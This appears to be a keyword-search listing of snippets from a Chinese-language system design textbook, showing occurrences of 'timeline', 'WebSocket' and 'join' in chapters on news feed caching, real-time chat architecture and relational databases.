  c22_b14.md: ...户同时触发昂贵兜底查询。每个用户最初几个请求预热其 timeline；后续请求命中缓存。5–10 分钟内大多数活跃用户 timeline 被重新填充。  **从数据库预预热：** 后台进程从数据库读取最近帖子和用户关注关系，为最活跃用户（日活前 10%）重...
  c22_b14.md: ...重新填充。  **从数据库预预热：** 后台进程从数据库读取最近帖子和用户关注关系，为最活跃用户（日活前 10%）重建 timeline。预热在数分钟而非数小时内完成。  教训：Redis（或任何用作预计算状态主数据源的内存存储）必须被视为关键组件，配置主...
  c22_b16.md: ...为 99.99% 用户关注者数在写时扇出可行范围内，而名人帖子可在读取时从缓存中廉价获取，混合方法高效处理整个分布。  Timeline 存储（Redis sorted set 中的预计算帖子 ID 列表）让普通用户部分 feed 组装达到亚毫秒级。名人帖...
  c22_b16.md: ...型的系统：不是预计算向用户展示什么内容，而是用户表达想要什么内容，系统必须在数十亿文档中毫秒级找到它。倒排索引与预计算 timeline 一样，用写入成本换读取速度——这一主线回连到本章核心权衡。...
  c22_b16.md: ...为 99.99% 用户关注者数在写时扇出可行范围内，而名人帖子可在读取时从缓存中廉价获取，混合方法高效处理整个分布。  Timeline 存储（Redis sorted set 中的预计算帖子 ID 列表）让普通用户部分 feed 组装达到亚毫秒级。名人帖...
  c22_b16.md: ...型的系统：不是预计算向用户展示什么内容，而是用户表达想要什么内容，系统必须在数十亿文档中毫秒级找到它。倒排索引与预计算 timeline 一样，用写入成本换读取速度——这一主线回连到本章核心权衡。...
  c23_b01.md: ...第 22 章，我们遇到一个如今应已熟悉的设计模式：在写入时预计算，使读取更快。新闻 feed 的预计算 timeline 与缓存思想相同，但专门应用于个性化、有序内容。你在写入时支付扇出成本，使读取时 feed 检索几乎免费。  倒排索引—...
  c23_b10.md: ...本。总计：约 50–70ms，远低于 200ms 目标。  **Q3.** 如第 22 章所见，新闻 feed 预计算 timeline 使读取更快。搜索倒排索引也这样做。但有一个重要区别：新闻 feed timeline 很快变陈旧（用户期望新帖 60...
  c23_b10.md: ...章所见，新闻 feed 预计算 timeline 使读取更快。搜索倒排索引也这样做。但有一个重要区别：新闻 feed timeline 很快变陈旧（用户期望新帖 60 秒内出现），而搜索引擎容忍索引新鲜度为分钟到小时。为什么搜索引擎能容忍更多陈旧？如果要...
  c23_b13.md: ...r 的重复检测以及基于优先级的调度是生产爬虫的三大支柱。  **倒排索引** 应用了第 7 章缓存和第 22 章预计算 timeline 中首次出现的“用写入成本换读取速度”的权衡。索引昂贵；搜索快是因为工作提前完成。Posting list 用 TF、位...
  c26_b01.md: ...值存储。Redis 在 SocialSnap v2 中作为缓存出现，在第 11 章作为外部会话存储，在第 22 章作为 timeline 存储，在第 25 章作为位置追踪数据库。每次键值存储都是你拿起的组件——一个更大系统中扮演特定角色的工具。  但这个工...
  c26_b06.md: ...保证与写 quorum 重叠，确保每次读都看到最新写。会话 token 若连 1 个请求都未持久化就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set...
  c26_b06.md: ...就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set）。N=3，W=1，R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出必须对 5000...
  c26_b06.md: ...lion）用户快速完成）。Sloppy quorum 加 hinted handoff 保证节点故障期间的高写可用性——timeline 即使在部分故障时也必须可写。  **位置追踪**（拼车服务，第 25 章，用作 SocialSnap 实时功能模板）：...
  c26_b06.md: ...节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle t...
  c26_b06.md: ...tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle tree 比较在约 20 次哈希比较内（每节点 10 亿键的 log₂ = 30 层）将分歧定位到...
  c26_b06.md: ...保证与写 quorum 重叠，确保每次读都看到最新写。会话 token 若连 1 个请求都未持久化就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set...
  c26_b06.md: ...就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set）。N=3，W=1，R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出必须对 5000...
  c26_b06.md: ...lion）用户快速完成）。Sloppy quorum 加 hinted handoff 保证节点故障期间的高写可用性——timeline 即使在部分故障时也必须可写。  **位置追踪**（拼车服务，第 25 章，用作 SocialSnap 实时功能模板）：...
  c26_b06.md: ...节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle t...
  c26_b06.md: ...tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle tree 比较在约 20 次哈希比较内（每节点 10 亿键的 log₂ = 30 层）将分歧定位到...
  c26_b08.md: ...节点确认——非常快。读只联系 1 个节点——非常快。但读联系的节点可能不是收到写的那个。用于 SocialSnap 的 timeline 缓存和位置追踪，速度 > 一致性。强一致（N=3，W=2，R=2）：W + R = 4 > 3。写必须 3 中 2 确...
  c26_b13.md: ...ies：第 25 章的位置存储展示了高写入吞吐 Redis——现在我们理解生产版该存储内部会是什么样子。第 22 章的 timeline 缓存依赖 Redis sorted set——现在我们理解使该存储可靠的复制和一致性模型。   ### 本章总结  本...
  c28_b19.md: ...低延迟）** 和 **ACID 关系型数据库（强一致性、更高延迟）**。张力：SocialSnap 用 Redis 做 timeline 缓存（第 22 章）——feed 可接受最终一致性。同样数据（帖子内容）存在 PostgreSQL——帖子需要强一致性...
  c28_b19.md: ...久且正确。它们共存是因为服务不同需求，但维护两者之间一致性是运营负担：帖子在 PostgreSQL 删除后，Redis timeline 必须失效。若失效失败（竞态、网络错误），Redis 会在 TTL 秒内把已删除帖子 served 给用户。两个系统的权...

=== websocket (92 occurrences) ===
  c09_b05.md: ...—它与第 7 章缓存中看到的新鲜度与性能 tradeoff（权衡）完全相同。   ### 9.6 HTTP、TCP 与 WebSocket——协议层  HTTP 是 Web 的协议，大多数应用流量通过它传输。但 HTTP 有多个版本，性能特征各不相同，有些应...
  c09_b07.md: ...#### WebSocket——全双工实时通信  HTTP 是请求-响应协议：客户端发送请求，服务器返回响应。服务器不能在没有客户端先请求的情况下主...
  c09_b07.md: ...推送给在线用户。当有人点赞 Alice 的帖子，Alice 应该立即看到通知角标更新——而不是等她下次加载页面。  **WebSocket** 提供全双工通信：经过初始 HTTP 握手（把连接升级到 WebSocket 协议）后，客户端和服务器可以随时互相发...
  c09_b07.md: ...更新——而不是等她下次加载页面。  **WebSocket** 提供全双工通信：经过初始 HTTP 握手（把连接升级到 WebSocket 协议）后，客户端和服务器可以随时互相发送消息。连接保持打开。服务器可以在任何时候推送数据。  **HTTP 轮询（不用...
  c09_b07.md: ...器立即响应，客户端随即再发一个请求。比轮询好（没有空响应），但仍是单向的（服务器不能独立于客户端请求主动推送）。  **WebSocket：** 客户端打开 WebSocket 连接。当通知产生时（由第 8 章的消息队列 like 事件处理器），通知服务直接...
  c09_b07.md: ...轮询好（没有空响应），但仍是单向的（服务器不能独立于客户端请求主动推送）。  **WebSocket：** 客户端打开 WebSocket 连接。当通知产生时（由第 8 章的消息队列 like 事件处理器），通知服务直接通过 WebSocket 推送给 Al...
  c09_b07.md: ...客户端打开 WebSocket 连接。当通知产生时（由第 8 章的消息队列 like 事件处理器），通知服务直接通过 WebSocket 推送给 Alice 连接的浏览器。亚秒级延迟。没有轮询开销。  WebSocket 的代价：它们是有状态的长连接。服务...
  c09_b07.md: ...e 事件处理器），通知服务直接通过 WebSocket 推送给 Alice 连接的浏览器。亚秒级延迟。没有轮询开销。  WebSocket 的代价：它们是有状态的长连接。服务器必须为每个连接客户端维护连接状态。100,000 个并发 WebSocket 连接...
  c09_b07.md: ...。  WebSocket 的代价：它们是有状态的长连接。服务器必须为每个连接客户端维护连接状态。100,000 个并发 WebSocket 连接用户意味着单台服务器要管理 100,000 个打开连接——每个都消耗内存。扩展 WebSocket 服务器需要仔细...
  c09_b07.md: ...000 个并发 WebSocket 连接用户意味着单台服务器要管理 100,000 个打开连接——每个都消耗内存。扩展 WebSocket 服务器需要仔细的会话管理（与第 11 章将探讨的有状态会话问题类似）。   ### 9.7 REST、GraphQL...
  c09_b09.md: ...UD 操作，API 表面小且稳定** → REST。GraphQL 的复杂度不合理。  **线索：实时双向通信** → WebSocket（标准 REST、GraphQL、gRPC 形式都不是，尽管 gRPC 流是一个选项）。  大多数生产系统使用多种：RE...
  c09_b09.md: ...形式都不是，尽管 gRPC 流是一个选项）。  大多数生产系统使用多种：REST 供公共消费者，gRPC 供内部服务，WebSocket 供实时功能。   ### 9.8 API 网关与限流  随着 SocialSnap 成长，应用服务器处理所有事情：认证...
  c09_b12.md: ...重新分配约 75% 的 key。对大型缓存，这种差异巨大，因为大规模缓存未命中会冲垮数据库。  **Q3.** 什么是 WebSocket？它与标准 HTTP 在实时应用中有何不同？举出一个适合 WebSocket 的应用，以及一个 HTTP 轮询就够用的应...
  c09_b12.md: ...中会冲垮数据库。  **Q3.** 什么是 WebSocket？它与标准 HTTP 在实时应用中有何不同？举出一个适合 WebSocket 的应用，以及一个 HTTP 轮询就够用的应用。  **答案：** **WebSocket** 是一种通信协议，在单个持...
  c09_b12.md: ...应用中有何不同？举出一个适合 WebSocket 的应用，以及一个 HTTP 轮询就够用的应用。  **答案：** **WebSocket** 是一种通信协议，在单个持久 TCP 连接上提供客户端与服务器之间的全双工、双向通信。经过升级的初始 HTTP 握手...
  c09_b13.md: ...WebSocket 让服务器可以在数据可用时立即推送。没有轮询、没有重复连接、亚秒级投递。  **WebSocket 是正确选择：** 实...
  c09_b13.md: ...WebSocket 让服务器可以在数据可用时立即推送。没有轮询、没有重复连接、亚秒级投递。  **WebSocket 是正确选择：** 实时聊天应用。当 Alice 给 Bob 发消息，Bob 的浏览器应立刻显示，无需轮询。服务器一收到...
  c09_b13.md: ...应用。当 Alice 给 Bob 发消息，Bob 的浏览器应立刻显示，无需轮询。服务器一收到消息就通过 Bob 打开的 WebSocket 连接推送。轮询会带来 5-30 秒延迟（取决于轮询间隔）和巨大服务器开销。  **HTTP 轮询够用：** 显示今日总...
  c09_b13.md: ...数据变化不频繁；15 分钟轮询间隔意味着客户端每小时发 4 次请求。开销可忽略，延迟最多 15 分钟对该场景可接受。加 WebSocket 会解决一个不存在的问题。  **Q4.** 限流的令牌桶算法是什么？它与简单固定窗口计数器在处理突发流量时有何不同？...
  c09_b15.md: ...查 Redis：EXISTS presence:{user_id}   **客户端更新协议：**  如果客户端已经打开 WebSocket 连接（用于通知，见 9.6 节），心跳可以作为 WebSocket 消息发送——避免每个心跳都走完整 HTTP 请求-...
  c09_b15.md: ...**客户端更新协议：**  如果客户端已经打开 WebSocket 连接（用于通知，见 9.6 节），心跳可以作为 WebSocket 消息发送——避免每个心跳都走完整 HTTP 请求-响应周期。WebSocket 服务器处理 `{ "type": "h...
  c09_b15.md: ...于通知，见 9.6 节），心跳可以作为 WebSocket 消息发送——避免每个心跳都走完整 HTTP 请求-响应周期。WebSocket 服务器处理 `{ "type": "heartbeat" }` 消息，刷新 Redis TTL。这复用了现有 WebS...
  c09_b15.md: ...cket 服务器处理 `{ "type": "heartbeat" }` 消息，刷新 Redis TTL。这复用了现有 WebSocket 基础设施，而不是新增 HTTP 端点。  如果客户端没有 WebSocket，每 30 秒发一次 HTTP POST...
  c09_b15.md: ...，刷新 Redis TTL。这复用了现有 WebSocket 基础设施，而不是新增 HTTP 端点。  如果客户端没有 WebSocket，每 30 秒发一次 HTTP POST 也完全可接受。  **为 feed 渲染查询在线状态：**  渲染 feed...
  c09_b15.md: ...ked` 事件。某个消费者需要把通知送到 Alice 的浏览器。什么协议支持服务器推送？如果有 100,000 个并发 WebSocket 连接，WebSocket 流量的限流是什么样？...
  c09_b15.md: ...需要把通知送到 Alice 的浏览器。什么协议支持服务器推送？如果有 100,000 个并发 WebSocket 连接，WebSocket 流量的限流是什么样？...
  c09_b16.md: ...知计数：`INCR user:1:notification_count` * 从 Redis 查找 Alice 的活动 WebSocket 连接：`GET user:1:ws_connections`  **第 3 步：通过 WebSocket 推送** 如...
  c09_b16.md: ...ce 的活动 WebSocket 连接：`GET user:1:ws_connections`  **第 3 步：通过 WebSocket 推送** 如果 Alice 在线（在 Redis 注册了活动 WebSocket 连接）：       { "type...
  c09_b16.md: ...tions`  **第 3 步：通过 WebSocket 推送** 如果 Alice 在线（在 Redis 注册了活动 WebSocket 连接）：       { "type": "notification_count_update", "count":...
  c09_b16.md: ...: "notification_count_update", "count": 7 }   该消息通过 Alice 的 WebSocket 连接推送。Alice 的浏览器毫秒级收到并更新角标。  如果 Alice 离线：不推送。等她下次加载页面时，获取通知计...
  c09_b16.md: ...：不推送。等她下次加载页面时，获取通知计数的 HTTP 请求从 Redis 读取已更新的计数器——已经是最新值。  **WebSocket 连接管理：** Alice 登录时，她的浏览器与通知服务器建立 WebSocket 连接。服务器注册：`SADD us...
  c09_b16.md: ...新的计数器——已经是最新值。  **WebSocket 连接管理：** Alice 登录时，她的浏览器与通知服务器建立 WebSocket 连接。服务器注册：`SADD user:1:ws_connections "server3:conn_4821"`。断...
  c09_b16.md: ...nections "server3:conn_4821"`。断开时移除注册。多个标签页或设备会产生多个连接条目。  **WebSocket 流量的限流：** HTTP 层限流（API 网关处的令牌桶）适用于 WebSocket 升级请求——在连接建立之前。一...
  c09_b16.md: ...设备会产生多个连接条目。  **WebSocket 流量的限流：** HTTP 层限流（API 网关处的令牌桶）适用于 WebSocket 升级请求——在连接建立之前。一旦连接建立，WebSocket 流量是服务器向客户端推送，而不是客户端猛烈请求服务器。相...
  c09_b16.md: ...：** HTTP 层限流（API 网关处的令牌桶）适用于 WebSocket 升级请求——在连接建立之前。一旦连接建立，WebSocket 流量是服务器向客户端推送，而不是客户端猛烈请求服务器。相关限流在服务端：如果通知服务每秒收到 10,000 条 `po...
  c09_b16.md: ...服务端：如果通知服务每秒收到 10,000 条 `post.liked` 事件，它不应向同一用户推送 10,000 条 WebSocket 消息/秒（这是名人的病态场景）。通知服务可以合并消息：发送“你有 N 条新通知”，而不是 N 次单独推送。...
  c09_b19.md: ...CP 的可靠与有序 vs UDP 的速度与可容忍丢失。大多数 Web 应用流量用 TCP；实时媒体常用 UDP。  **WebSocket** 为实时应用实现全双工服务器推送，代价是有状态的连接，使水平扩展复杂化（第 11 章直接处理这个问题）。  **RE...
  c11_b09.md: ...模板），这些文件在其他服务器上不存在。下载 Server A 生成文件的请求若路由到 Server B 会失败。  **WebSocket 连接状态：** 如果应用服务器把 WebSocket 连接存在本地内存（第 9 章讨论过），一个客户端的 WebSoc...
  c11_b09.md: ...r A 生成文件的请求若路由到 Server B 会失败。  **WebSocket 连接状态：** 如果应用服务器把 WebSocket 连接存在本地内存（第 9 章讨论过），一个客户端的 WebSocket 连接只属于一台服务器。该服务器重启，连接丢失。...
  c11_b09.md: ...Socket 连接状态：** 如果应用服务器把 WebSocket 连接存在本地内存（第 9 章讨论过），一个客户端的 WebSocket 连接只属于一台服务器。该服务器重启，连接丢失。客户端重连到不同服务器，新服务器没有先前连接的上下文。  **后台作业状...
  c11_b09.md: ...到共享基础设施**。会话 → Redis。文件 → 对象存储。缓存 → Redis。后台作业状态 → 数据库或队列系统。WebSocket 连接状态 → Redis pub/sub 或 WebSocket 网关服务。  遵循无状态要求的应用服务器是纯计算节点...
  c11_b09.md: ...→ Redis。后台作业状态 → 数据库或队列系统。WebSocket 连接状态 → Redis pub/sub 或 WebSocket 网关服务。  遵循无状态要求的应用服务器是纯计算节点：接收请求，从共享基础设施读取状态，计算结果，把状态写回共享基础设...
  c21_b02.md: ...通常 1MB 栈内存）。50 万线程 × 1MB = 500 GB 内存仅用于连接处理。  长轮询对小型系统或不值得上 WebSocket 基础设施的系统是合理方法，但它不能优雅扩展。   #### WebSockets——实时聊天的正确答案  **WebS...
  c21_b02.md: ...确答案  **WebSockets** 提供客户端与服务器之间持久、双向、全双工连接。初始 HTTP 握手把连接升级到 WebSocket 协议后，双方可在任何时候发消息，无需 HTTP 请求/响应帧开销。  WebSocket 模型：  1. 客户端打开到...
  c21_b02.md: ...HTTP 握手把连接升级到 WebSocket 协议后，双方可在任何时候发消息，无需 HTTP 请求/响应帧开销。  WebSocket 模型：  1. 客户端打开到 `wss://chat.socialsnap.com/ws` 的 WebSocket 连...
  c21_b02.md: ...WebSocket 模型：  1. 客户端打开到 `wss://chat.socialsnap.com/ws` 的 WebSocket 连接 2. 服务器无限期维持该连接 3. 用户 A 给用户 B 发消息时，服务器立即通过用户 B 的 WebSocke...
  c21_b02.md: ...ebSocket 连接 2. 服务器无限期维持该连接 3. 用户 A 给用户 B 发消息时，服务器立即通过用户 B 的 WebSocket 连接推送消息 4. 客户端收到消息并显示，无需发起任何请求  WebSocket 连接是有状态的：服务器知道哪个用户在...
  c21_b02.md: ...发消息时，服务器立即通过用户 B 的 WebSocket 连接推送消息 4. 客户端收到消息并显示，无需发起任何请求  WebSocket 连接是有状态的：服务器知道哪个用户在哪个连接上。连接本身持有用户身份上下文。这很优雅，但也带来我们之前提到的扩展挑战—...
  c21_b02.md: ...上。连接本身持有用户身份上下文。这很优雅，但也带来我们之前提到的扩展挑战——服务器不能是无状态的。   #### 定义：WebSocket  **WebSocket** 是一种网络协议，通过单一 TCP 连接在客户端与服务器之间提供持久、全双工通信通道。与...
  c21_b02.md: ...下文。这很优雅，但也带来我们之前提到的扩展挑战——服务器不能是无状态的。   #### 定义：WebSocket  **WebSocket** 是一种网络协议，通过单一 TCP 连接在客户端与服务器之间提供持久、全双工通信通道。与 HTTP 不同——HTTP...
  c21_b02.md: ...TCP 连接在客户端与服务器之间提供持久、全双工通信通道。与 HTTP 不同——HTTP 中客户端必须发起每个请求——WebSocket 允许连接建立后任何一方随时发送数据。  plain 语言：WebSocket 是电话线。HTTP 是一系列单独电话呼叫...
  c21_b02.md: ...——HTTP 中客户端必须发起每个请求——WebSocket 允许连接建立后任何一方随时发送数据。  plain 语言：WebSocket 是电话线。HTTP 是一系列单独电话呼叫。WebSocket 让线路保持开放，任何一方有话就说。...
  c21_b02.md: ...允许连接建立后任何一方随时发送数据。  plain 语言：WebSocket 是电话线。HTTP 是一系列单独电话呼叫。WebSocket 让线路保持开放，任何一方有话就说。...
  c21_b03.md: ...#### 常见误解  一个常见误解是 WebSocket 总是比 HTTP 更适合实时功能。这过度泛化。WebSocket 在以下情况才是正确选择：(a) 服务器需要频繁向客户...
  c21_b03.md: ...#### 常见误解  一个常见误解是 WebSocket 总是比 HTTP 更适合实时功能。这过度泛化。WebSocket 在以下情况才是正确选择：(a) 服务器需要频繁向客户端推送消息，无需客户端轮询；(b) 每个事件都新建 HTTP 连接...
  c21_b03.md: ...，HTTP 轮询或 Server-Sent Events（一种比 WebSocket 更简单的单向推送机制）可能更合适。WebSocket 有真实成本：每个连接消耗服务器端资源，连接管理增加运营复杂度。   ### 21.2 连接架构——WebSocket...
  c21_b03.md: ...。WebSocket 有真实成本：每个连接消耗服务器端资源，连接管理增加运营复杂度。   ### 21.2 连接架构——WebSocket 放在哪里？  WebSocket 连接产生根本性的有状态的（stateful）元素：每个用户连到特定服务器。如果用户...
  c21_b03.md: ...每个连接消耗服务器端资源，连接管理增加运营复杂度。   ### 21.2 连接架构——WebSocket 放在哪里？  WebSocket 连接产生根本性的有状态的（stateful）元素：每个用户连到特定服务器。如果用户 A 连到服务器 S1，发给用户 A...
  c21_b03.md: ...了无状态的（stateless）扩展模型。URL 短链中，任意 10 台应用服务器都能处理任意请求——所有状态在数据库。WebSocket 聊天中，服务器状态（打开的连接）对每个服务器都是本地的。   #### 连接服务器  架构分离职责：**连接服务器**...
  c21_b03.md: ...架构分离职责：**连接服务器**（也称 **gateway 服务器** 或 **presence 服务器**）管理 WebSocket 连接，而 **应用服务器** 处理业务逻辑。  每台连接服务器管理若干 WebSocket 连接。50 万（500,0...
  c21_b03.md: ...ence 服务器**）管理 WebSocket 连接，而 **应用服务器** 处理业务逻辑。  每台连接服务器管理若干 WebSocket 连接。50 万（500,000）并发用户下，若每台连接服务器管理 5 万（50,000）个连接，需要 10 台连接服务...
  c21_b03.md: ...50,000）个连接，需要 10 台连接服务器。  用户 A 给用户 B 发消息时：  1. 用户 A 的客户端通过其 WebSocket 把消息发到 A 所在的连接服务器 S1 2. S1 收到消息并转给 **消息服务**（应用逻辑层） 3. 消息服务持久...
  c21_b03.md: ...持久化消息，并确定 B 连在哪台连接服务器 4. 消息服务把消息发给那台服务器（称为 S3） 5. S3 通过 B 的 WebSocket 连接推送消息  路由问题：消息服务怎么知道 B 连在哪台服务器？  **连接注册表：** 一个集中存储（Redis 理...
  c21_b03.md: ...一个集中存储（Redis 理想）将 `user_id → connection_server_id` 映射。用户连到 WebSocket 服务器时，服务器写入：`SET user:B:server S3`。消息服务要给 B 投递时读取该注册表。用户断开时，...
  c21_b06.md: ...但大规模下，presence 带来有趣设计挑战。   #### 朴素方法及其问题  **朴素设计：** 用户 A 连接 WebSocket 时，连接服务器（server）写入 `SET user:A:online true` 到 Redis。A 断开时，连接...
  c21_b08.md: ...发送者客户端把消息提交到服务器。服务器已持久化。 * **DELIVERED：** 接收者客户端收到消息（客户端通过 WebSocket 发送投递确认）。 * **READ：** 接收者打开对话，消息被显示（客户端发送已读确认）。  这些状态转换发生在不同...
  c21_b08.md: ...3。S3 的确认必须传播回 S1，发送者客户端才能更新显示。  **投递回执流程：**  1. 服务器通过 S3 上的 WebSocket 把消息 M 投递给接收者 R 2. 接收者客户端发送 `{type: "delivered", message_id:...
  c21_b08.md: ...投递给接收者 R 2. 接收者客户端发送 `{type: "delivered", message_id: M}` 回 WebSocket 3. S3 收到该确认并写数据库：`UPDATE messages SET delivered_at = NOW()...
  c21_b08.md: ..._receipt", message_id: M}` 给 S（发送者所在服务器 S1） 6. S1 把回执推送到发送者 WebSocket 连接 7. 发送者 UI 更新：消息勾选从单勾（已发送）变双勾（已送达）  **一致性挑战：** 如果 S3 在步骤...
  c21_b10.md: ...失败。  **v7（第 21 章）：** 加入 DM 功能。引入全新架构域——实时、有状态的（stateful）、基于 WebSocket 的通信——与现有无状态的（stateless）基于 HTTP 的 feed 和帖子系统并行运行。DM 系统与核心 fe...
  c21_b10.md: ...ess，水平扩展）服务 feed、帖子、用户资料 * **连接服务器**（有状态的，stateful，管理 DMs 的 WebSocket 连接） * **PostgreSQL 集群**（按 `user_id` 分片）存储帖子和用户数据 * **Postgr...
  c21_b11.md: ...系统权衡矩阵  设计决策 | 延迟 | 一致性 | 可用性 | 运营复杂度 ---|---|---|---|--- 用 WebSocket 投递 | 很低（100ms 内推送） | N/A | 中（连接状态） | 高（连接管理） 先持久化消息流 | 略高（两...
  c21_b12.md: ...#### 概念检测  **Q1.** HTTP 与 WebSocket 通信的根本区别是什么，为什么对聊天应用重要？  **答案：** HTTP 是由客户端发起的请求-响应协议。客户端发送请...
  c21_b12.md: ...服务器恰好返回一个响应；连接关闭（或复用于下一个请求，但总是客户端发起）。服务器没有客户端先请求就无法向客户端发送数据。WebSocket 是持久、双向协议。初始握手后，客户端和服务器都可以在任意时间发消息。服务器可以无需等待请求就向客户端推送数据。对聊天，...
  c21_b12.md: ...发消息给你时，服务器需要立即把它推到你设备。用 HTTP，你就需要持续轮询（“有新消息吗？”），浪费带宽并增加延迟。用 WebSocket，消息在服务器收到瞬间到达你设备，无需轮询。  **Q2.** 为什么消息必须先持久化再经 WebSocket 投递，这...
  c21_b12.md: ...延迟。用 WebSocket，消息在服务器收到瞬间到达你设备，无需轮询。  **Q2.** 为什么消息必须先持久化再经 WebSocket 投递，这防止了什么故障模式？  **答案：** 先持久化规则确保消息不会因基础设施故障而丢失。考虑替代方案：先投递，再...
  c21_b12.md: ...了什么故障模式？  **答案：** 先持久化规则确保消息不会因基础设施故障而丢失。考虑替代方案：先投递，再持久化。如果 WebSocket 投递成功但数据库写入失败（数据库不可用、网络分区），接收者已在屏幕上看到消息但从未存储。当他关闭并重新打开应用，消息没...
  c21_b12.md: ...到消息但从未存储。当他关闭并重新打开应用，消息没了——历史无法获取，因为它从未持久化。用先持久化：如果数据库写入成功但 WebSocket 投递失败（接收者离线、连接断开、服务器崩溃），消息已存在数据库。接收者重连时拉取。如果数据库写入失败，发送者收到错误可...
  c21_b13.md: ...发送者。思考连接服务器在步骤间崩溃会怎样。  **答案：**  **状态：SENT**  1. 用户 A 的客户端通过 WebSocket 向连接服务器 S1 发送 `{type: "message", to: B, content: "Hey!", cli...
  c21_b13.md: ...456, from: A, content: "Hey!", sent_at: T1}` 给 S3。 8. S3 通过 WebSocket 把消息推送给 B 的客户端。 9. B 的客户端显示消息，并立即通过 WebSocket 回发 `{type: "de...
  c21_b13.md: ...给 S3。 8. S3 通过 WebSocket 把消息推送给 B 的客户端。 9. B 的客户端显示消息，并立即通过 WebSocket 回发 `{type: "delivery_ack", message_id: M456}`。 10. S3 收到 ac...
  c21_b13.md: ...livery_receipt", message_id: M456}` 给 S1。 13. S1 把回执推送到 A 的 WebSocket。 14. A 的 UI 更新 M456 为双勾（已送达接收者设备）。  **状态：READ** 15. B 打开包含...
  c21_b13.md: ...pe: "read_receipt", message_id: M456}` 给 S1。 19. S1 推送给 A 的 WebSocket。 20. A 的 UI 更新 M456 为蓝色双勾（接收者已读）。  **崩溃恢复：** 如果 S3 在第 10 步和...
  c21_b14.md: ...表：10 次服务器间发送，每台交付给 50 个本地连接。这极大减少服务器间调用。 * 每台连接服务器收到消息后并行通过 WebSocket 推送给其 50 个本地接收者：约 5ms（全部并行）。  **修正时间线：**  * 批量注册表查找：5ms * 按服...
  c21_b14.md: ...数据库消息写入和 (b) 推送通知投递的平均 QPS 与峰值 QPS。然后指出哪个组件（数据库写路径、推送通知服务或 WebSocket 连接服务器）最可能成为首个扩展瓶颈。  提示  应用第 3 章估算框架：日总量 → 每秒平均 → 峰值倍数。瓶颈问题需...
  c21_b14.md: ...时）。峰值晚间并发活跃用户：约占 DAU 10–15% = **5 万–7.5 万（50,000–75,000）个同时 WebSocket 连接**。...
  c21_b15.md: ...每台 WebSocket 连接服务器通常可容纳 1 万–10 万（10,000–100,000）个连接，具体取决于内存和配置。5 万–7.5 万...
  c21_b15.md: ...连接服务器——数量可管理，但连接服务器层是最有状态的（stateful）且运营最复杂的组件。  **首个瓶颈：** **WebSocket 连接服务器层** 是首个架构复杂度，不是因为它最先失败，而是因为它最难水平扩展。数据库写入和推送通知几乎是可加节点扩展...
  c21_b15.md: ...** 是首个架构复杂度，不是因为它最先失败，而是因为它最难水平扩展。数据库写入和推送通知几乎是可加节点扩展的无状态操作。WebSocket 服务器持有有状态的长连接——添加新服务器需要重新分布连接（已有连接留在当前服务器；新连接去新服务器）。扩展需要仔细的连...
  c21_b17.md: ...短链无状态的（stateless）、读多、优化快速查找；聊天有状态的（stateful）、写多、优化低延迟双向通信。  WebSocket 是实时消息的首选传输：持久、双向、支持服务器主动推送。连接服务器管理 WebSocket 连接并维护连接注册表（在 R...
  c21_b17.md: ...写多、优化低延迟双向通信。  WebSocket 是实时消息的首选传输：持久、双向、支持服务器主动推送。连接服务器管理 WebSocket 连接并维护连接注册表（在 Redis 中），用于在不同服务器上的用户之间路由消息。  消息总是先持久化再投递——持久化...
  c21_b17.md: ...v7 代表完整的当前架构：核心产品用无状态的（stateless）HTTP 服务，实时消息用有状态的（stateful）WebSocket 服务，每个都有各自的扩展模型、一致性要求和运营特征。...

=== join (85 occurrences) ===
  c01_b04.md: ...as）、数据库前面的缓存（caches）。但现在数据大到单机放不下。你必须把数据库拆到多台机器上——但跨机器的 SQL JOIN 慢得灾难。你的部署流程要花一小时。生产环境的一个 bug 几分钟内影响 1 亿人。每个工程决策现在都有复合后果（com...
  c01_b07.md: ...机器。100 万用户时，数据可能超出任何单机的存储或查询能力——需要 partitioning（分区），这会破坏关系型 join，并让某些操作从根本上变得更昂贵。  **Q3.** 本章说“规模下故障是常态”。这在实践中意味着什么，以及它如何改变系...
  c05_b02.md: ...#### Join 的力量  关系模型的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合...
  c05_b02.md: ...#### Join 的力量  关系模型的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice...
  c05_b02.md: ...sername, posts.content, posts.created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username...
  c05_b02.md: ...osts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4. 返回用户...
  c05_b02.md: ...#### Join 的力量  关系模型的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合...
  c05_b02.md: ...#### Join 的力量  关系模型的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice...
  c05_b02.md: ...sername, posts.content, posts.created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username...
  c05_b02.md: ...osts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4. 返回用户...
  c05_b02.md: ...#### Join 的力量  关系模型的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合...
